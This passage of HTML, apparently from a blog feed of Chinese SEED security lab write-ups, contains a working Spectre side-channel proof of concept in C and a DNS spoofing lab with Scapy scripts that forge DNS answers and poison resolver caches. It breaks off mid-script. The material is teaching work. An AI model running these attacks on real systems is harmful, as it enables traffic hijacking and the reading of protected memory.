class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> buffer_size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; buffer_size) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> larger_x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    _mm_clflush(&amp;buffer_size);</span><br><span class="line">    <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush buffer_size and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;buffer_size);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">  s = restrictedAccess(larger_x);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x&lt;<span class="number">17</span>; x++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(scores, <span class="number">0</span>, <span class="keyword">sizeof</span>(scores));</span><br><span class="line">    <span class="type">size_t</span> larger_x = (<span class="type">size_t</span>)(secret-(<span class="type">char</span>*)buffer + x);</span><br><span class="line">    flushSideChannel();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      spectreAttack(larger_x);</span><br><span class="line">      reloadSideChannelImproved();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     <span class="keyword">if</span>(scores[max] &lt; scores[i])  </span><br><span class="line">       max = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at %p = &quot;</span>, (<span class="type">void</span>*)larger_x);</span><br><span class="line">    usleep(<span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The  secret value is %d \t %c\n&quot;</span>, max,max);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreAttackImproved SpectreAttackImproved.c</span><br></pre></td></tr></table></figure><p>将**usleep( )**修改了很多次，均无法输出秘密值：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702524989685-e7746bd1-e8c9-444f-8308-247ac61aed19.png#averageHue=%230f0d0b&clientId=u4568489d-13ea-4&from=paste&height=422&id=u185969ac&originHeight=664&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=156251&status=done&style=none&taskId=ue5105477-5dc9-4017-80eb-8f91367947d&title=&width=669.8413002608148" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab 幽灵攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEEDLAB：DNS欺骗实验</title>
      <link href="/post/4aa986b5.html"/>
      <url>/post/4aa986b5.html</url>
      
        <content type="html"><![CDATA[<p><a name="cIZ0i"></a></p><h1 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、    实验目的"></a>一、    实验目的</h1><p><a name="Juc2u"></a></p><h2 id="1-overview"><a href="#1-overview" class="headerlink" title="1 overview"></a>1 overview</h2><p>本实验的目标是获得对DNS（域名系统）的各种攻击的第一手经验。DNS是互联网的电话簿；它将主机名转换为IP地址，反之亦然。这种转换是通过DNS解析实现的，这种解析发生在幕后。DNS欺骗攻击以各种方式操纵此解析过程，目的是将用户误导到其他目的地，这些目的地通常是恶意的。本实验室主要研究几种DNS欺骗攻击技术。将首先设置和配置DNS服务器，然后在实验室环境中的目标上尝试各种DNS欺骗攻击。<br />第一个大实验任务（本地DNS欺骗）中进行的攻击假设攻击者位于同一本地网络上，因此可以嗅探DNS数据包。这个假设是为了简化实验任务。<br />第二个大实验任务为远程DNS攻击实验，攻击者在没有嗅探数据包的情况下发起远程欺骗攻击，远程攻击实验室比本地DNS欺骗实验更具挑战性。</p><p><a name="vg0k9"></a></p><h1 id="二、-实验步骤及结果"><a href="#二、-实验步骤及结果" class="headerlink" title="二、    实验步骤及结果"></a>二、    实验步骤及结果</h1><p><a name="AvOlR"></a></p><h2 id="2-DNS-Local"><a href="#2-DNS-Local" class="headerlink" title="2  DNS _Local"></a><strong>2  DNS _Local</strong></h2><p><a name="sVEWg"></a></p><h3 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a><strong>2.1 环境搭建</strong></h3><p><a name="KnXw7"></a></p><h4 id="容器部署"><a href="#容器部署" class="headerlink" title="容器部署"></a>容器部署</h4><ol><li>清除上次docker网络环境<br /> <img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701678793480-ac777812-d723-4a4d-b8b4-50e60141556e.png#averageHue=%230c0b0a&clientId=u16fa8936-5c81-4&from=paste&height=241&id=ucbd9ce0c&originHeight=380&originWidth=1035&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=86269&status=done&style=none&taskId=ube52703e-2d63-4803-b9c2-38cb4c00f96&title=&width=657.1428869857283" alt="image.png"></li><li>启动本次实验的容器</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701679618439-28cfbfd2-bdb1-4f04-ba46-ecf1514c523d.png#averageHue=%230e0c09&clientId=u16fa8936-5c81-4&from=paste&height=383&id=u0b043e9e&originHeight=665&originWidth=1061&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=167544&status=done&style=none&taskId=u01969ea7-a3e6-4e52-b6ca-9fb5f9de8e1&title=&width=610.6508178710938" alt="image.png"></p><ol start="3"><li>LAN结构</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701679771240-3de7a6f0-b7e7-47f7-b7ab-4c3f9e416a5f.png#averageHue=%23f3f3f2&clientId=u16fa8936-5c81-4&from=paste&height=307&id=u28780c7f&originHeight=817&originWidth=1459&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=181106&status=done&style=none&taskId=u80101b35-62f5-483b-9cc3-733b4f4230a&title=&width=548.3492431640625" alt="image.png"><br />我们启动时用对应的CONTAINER ID即可：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701680085493-050c2f4e-710c-45b6-bf67-2a65f6358e8b.png#averageHue=%230a0806&clientId=u16fa8936-5c81-4&from=paste&height=140&id=u1ee44b64&originHeight=190&originWidth=622&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=42996&status=done&style=none&taskId=ud639dadd-1a5f-4f23-b1c1-01c0ad1458b&title=&width=458.9980163574219" alt="image.png"><br><a name="witbD"></a></p><h4 id="了解攻击者容器"><a href="#了解攻击者容器" class="headerlink" title="了解攻击者容器"></a>了解攻击者容器</h4><p><a name="FjMjj"></a></p><h5 id="•-Shared-folder"><a href="#•-Shared-folder" class="headerlink" title="• Shared folder"></a>• <em>Shared folder</em></h5><p>当我们使用攻击者容器来启动攻击时，我们需要将攻击代码放在攻击者容器中。代码编辑在VM中比在容器中更方便，因为我们可以使用我们最喜欢的编辑器。为了让VM和容器共享文件，我们已经使用Docker卷在VM和容器之间创建了一个共享文件夹。如果您查看Docker组成文件，您会发现我们已经在一些容器中添加了以下条目。表示将主机（即VM)上的.&#x2F;volues文件夹装载到容器内的&#x2F;volues文件夹。我们将把代码写入.&#x2F;volous文件夹（在VM上），以便它们可以在容器中使用。<br><a name="LAiS2"></a></p><h5 id="•-Host-mode"><a href="#•-Host-mode" class="headerlink" title="• Host mode"></a>• <em>Host mode</em></h5><p>在这个实验室中，攻击者需要能够嗅探数据包，但在一个容器内运行嗅探程序有问题，因为一个容器是有效地连接到一个虚拟的开关，所以它只能看到自己的流量，它永远不会看到其他容器中的数据包。为了解决这个问题，我们使用了攻击者容器的主机模式。这允许攻击者容器查看所有的流量。在攻击者容器上使用的下列条目如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1699862046796-34d40ca0-6038-4889-817f-b9c55814149f.png#averageHue=%2323201f&clientId=u57db4859-e4a5-4&from=paste&height=230&id=wDUT6&originHeight=362&originWidth=647&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=30031&status=done&style=none&taskId=uacb9c441-0b90-4c1d-85b5-f916e649675&title=&width=410.79366944904945" alt="image.png"><br />当容器处于host模式时，它可以看到所有主机的网络接口，它甚至具有与主机具有相同的IP地址。基本上，它与主机虚拟机放在相同的网络名称空间中。但是，容器仍然是一个独立的机器，因为它的其他名称空间仍然与主机不同。<br><a name="X2l4H"></a></p><h4 id="DNS配置"><a href="#DNS配置" class="headerlink" title="DNS配置"></a>DNS配置</h4><p><strong>1）Local DNS Server(对应10.9.0.53)</strong></p><ul><li>简化：将源端口号固定为33333（DNS服务器会将DNS请求的源端口号随机化使得攻击更加困难）。文件named.conf.options:</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701688949108-d5dc9176-9697-43ec-b93a-0fa8022c2ac3.png#averageHue=%23252423&clientId=ufc1ead2d-f657-4&from=paste&height=29&id=u7f1e2763&originHeight=46&originWidth=460&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3907&status=done&style=none&taskId=ud11e973c-0c88-4353-8381-9f92a7a6789&title=&width=292.06350532699037" alt="image.png"></p><ul><li>关闭DNSSEC（DNSSEC 是防止DNS欺骗的保护机制）。文件named.conf.options:</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689281138-1f4f5cd1-1c75-495b-8932-a5657b99cbbb.png#averageHue=%23302f2d&clientId=ufc1ead2d-f657-4&from=paste&height=44&id=u33761ff7&originHeight=57&originWidth=360&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=6013&status=done&style=none&taskId=ucbfa7597-491a-43bf-b9c0-31dfe781503&title=&width=279.56549072265625" alt="image.png"></p><ul><li>转发到attacker32.com区域。此如果有人查询attacker32.com域，查询将被转发到该域的名称服务器，该服务器托管在攻击者容器中。区域条目被放在命名的.conf文件中。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689582328-8a8d3df7-9ad6-4753-8627-294e1221a02e.png#averageHue=%23222120&clientId=ufc1ead2d-f657-4&from=paste&height=143&id=ufda0097c&originHeight=225&originWidth=377&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=13264&status=done&style=none&taskId=u2284d735-8f25-45d4-97e0-733827bb88d&title=&width=239.36509023538122" alt="image.png"><br /><strong>2）user</strong><br />在resolv.conf中将10.9.0.53添加为第一条nameserver记录，将local dns server作为首要的DNS服务器。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689661316-701f4025-271f-4540-855d-377f88ebf0db.png#averageHue=%23a7926f&clientId=ufc1ead2d-f657-4&from=paste&height=102&id=ub19a7f56&originHeight=160&originWidth=839&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=16626&status=done&style=none&taskId=u2db0785b-63dd-46bd-b62a-52120ffa62c&title=&width=532.6984368898802" alt="image.png"><br /><strong>3）Attacker</strong><br />Attacker的nameserver（ named.conf），第一个为合法的zone attacker32.com，第二个为虚假的example.com zone：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701689836008-f3aab94c-d406-45c6-80c5-842c212f337c.png#averageHue=%23242221&clientId=ufc1ead2d-f657-4&from=paste&height=202&id=ufafa595b&originHeight=318&originWidth=594&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=25189&status=done&style=none&taskId=u2b3a6069-73b2-447b-99eb-2d34d3a87c4&title=&width=377.14287427007014" alt="image.png"><br><a name="e97hC"></a></p><h4 id="测试部署"><a href="#测试部署" class="headerlink" title="测试部署"></a>测试部署</h4><p><strong>Get the IP address of ns.attacker32.com</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701691667853-75a84f81-e342-4732-b854-6e8de8c22f2f.png#averageHue=%23232222&clientId=ufc1ead2d-f657-4&from=paste&height=383&id=ue1ae71ff&originHeight=657&originWidth=1110&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=80238&status=done&style=none&taskId=u5a7dc529-61dc-4a29-b18a-f81149d9673&title=&width=646.6349487304688" alt="image.png"></p><p><strong>Get the IP address of <a href="http://www.example.com/">www.example.com</a></strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701692524460-5c3c1eab-b6cc-42a2-b2e4-b3acb0c1fd63.png#averageHue=%23242322&clientId=ufc1ead2d-f657-4&from=paste&height=418&id=u45591f75&originHeight=629&originWidth=893&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69175&status=done&style=none&taskId=u79a275a1-e257-447f-801b-57ee36a3d67&title=&width=593.9801635742188" alt="image.png"><br />命令换为dig @ns.attacker32.com <a href="http://www.example.com，可以看到返回的内容与上面相同：">www.example.com，可以看到返回的内容与上面相同：</a><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701694101157-e4614cfd-6375-4436-aeae-ec612fc03f9a.png#averageHue=%23262423&clientId=ufc1ead2d-f657-4&from=paste&height=411&id=ub7682fea&originHeight=647&originWidth=937&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=73510&status=done&style=none&taskId=u097079b0-36b2-4ac9-9f8a-eca61afa6e7&title=&width=594.9206619378042" alt="image.png"><br><a name="Habcl"></a></p><h3 id="2-2-The-Attack-Tasks"><a href="#2-2-The-Attack-Tasks" class="headerlink" title="2.2 The Attack Tasks"></a><strong>2.2 The Attack Tasks</strong></h3><p><a name="Lmxw7"></a></p><h4 id="Task-1-Directly-Spoofing-Response-to-User"><a href="#Task-1-Directly-Spoofing-Response-to-User" class="headerlink" title="Task 1: Directly Spoofing Response to User"></a><strong>Task 1: Directly Spoofing Response to User</strong></h4><blockquote><p>当用户在web浏览器中键入网站的名称（主机名，如<a href="http://www.example.com)时,用户的计算机将向本地dns服务器发送dns请求,以解析主机名的ip地址.攻击者可以嗅探dns请求消息,然后他们可以立即创建一个假的dns响应,并发送回用户机器.如果假回复比真实回复提前到达,它将被用户机器接受./">www.example.com）时，用户的计算机将向本地DNS服务器发送DNS请求，以解析主机名的IP地址。攻击者可以嗅探DNS请求消息，然后他们可以立即创建一个假的DNS响应，并发送回用户机器。如果假回复比真实回复提前到达，它将被用户机器接受。</a></p></blockquote><p><strong>在local DNS Server 使用命令rndc flush清除缓存</strong>。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701694496297-01ebc924-b3f3-40bc-97b4-db470e08d6ee.png#averageHue=%23252423&clientId=ufc1ead2d-f657-4&from=paste&height=104&id=ua1dc0443&originHeight=164&originWidth=944&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27569&status=done&style=none&taskId=u0b9d252b-fc35-4988-9a59-d975f6baa0e&title=&width=599.3651065840845" alt="image.png"><br />每次攻击前都要清除缓存，如果缓存有答案，那么来自本地DNS服务器的回复将比我们的欺骗的回复更快，那么我们的的攻击将无法成功。</p><p>使用项目所给代码（别忘了改监听网卡）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The Answer Section</span></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">                 </span><br><span class="line">    <span class="comment"># The Authority Section</span></span><br><span class="line">    NSsec = DNSRR(rrname=<span class="string">&#x27;example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># The Additional Section</span></span><br><span class="line">    <span class="comment"># Addsec = DNSRR(rrname=&#x27;ns1.example.net&#x27;, type=&#x27;A&#x27;, ttl=259200, rdata=&#x27;1.2.3.4&#x27;)                </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">2</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)      </span><br></pre></td></tr></table></figure><p>在seed-attacker容器内运行如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701695948025-8d2467b3-a593-4847-b62b-207e0693b6b0.png#averageHue=%23242322&clientId=ufc1ead2d-f657-4&from=paste&height=182&id=u47a609a5&originHeight=287&originWidth=890&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=33479&status=done&style=none&taskId=u50d72065-fce0-4437-a4b5-d016591ad7f&title=&width=565.0793907413508" alt="image.png"><br />user端进行dns请求，实际信息被篡改，即攻击成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701696333502-ef6eb033-8cb1-464f-bd38-c51141d8d284.png#averageHue=%23272222&clientId=ufc1ead2d-f657-4&from=paste&height=401&id=u5fba50bc&originHeight=631&originWidth=1048&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66068&status=done&style=none&taskId=ud7e8d5cd-d8fc-49ba-b972-078167a7510&title=&width=665.3968556145345" alt="image.png"><br><a name="CBb3M"></a></p><h4 id="Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers"><a href="#Task-2-DNS-Cache-Poisoning-Attack-–-Spoofing-Answers" class="headerlink" title="Task 2: DNS Cache Poisoning Attack – Spoofing Answers"></a><strong>Task 2: DNS Cache Poisoning Attack – Spoofing Answers</strong></h4><blockquote><p> task1将攻击目标聚焦于user，需要总是等待user进行请求，效率并不高。task2将目标聚焦于DNS server，会是更高效的方式，即DNS缓存投毒：如果攻击者伪装从其他DNS server来的响应，该DNS Server就会把内容存储在缓存中，会保留相当长的一段时间。在该期间的请求都会直接返回缓存内的结果。我们只需spoof一次，影响就会持续直到下次缓存更新。</p></blockquote><p>编写代码spoonf_answer.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">    NSsec = DNSRR(rrname=<span class="string">&#x27;example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)             </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span 